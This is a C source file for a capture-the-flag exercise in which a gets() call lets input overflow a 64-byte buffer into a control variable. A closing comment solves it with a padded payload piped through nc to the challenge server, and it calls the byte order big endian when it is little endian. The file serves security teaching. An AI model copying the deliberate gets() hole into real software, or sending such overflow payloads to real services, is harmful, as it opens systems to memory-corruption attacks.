#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include "../general.h"

int main() {
  init();
  int control;
  char buffer[64];

  printf("You win this game if you can change variable control to the value 0x61626364\n");

  control = 0;
  gets(buffer);

  if (control == 0x61626364) {
      printf("Congratulations, you win!!! You correctly got the variable to the right value\n");
      printf("Flag: %s\n", getflag());
  } else {
      printf("Try again, you got 0x%08x\n, instead of 0x61626364", control);
  }
}


/*
    
 The same thing as the challenge 0 but this time instead of random bytes we need to write a specific number. 

 The buffer is at 0xbfffeecc and the variable control is at 0xbfffef0c. So we need to write :


			0xbfffef0c - 0xbfffeecc + 4 = 64 + 4 , where the last 4 bytes will be "\x64\x63\x62\x61" 
 
			which is 0x61626364 in big endian 

 
 python -c 'print "A"*64 + "\x64\x63\x62\x61" ' | nc mustard.stt.rnl.tecnico.ulisboa.pt 9991


*/



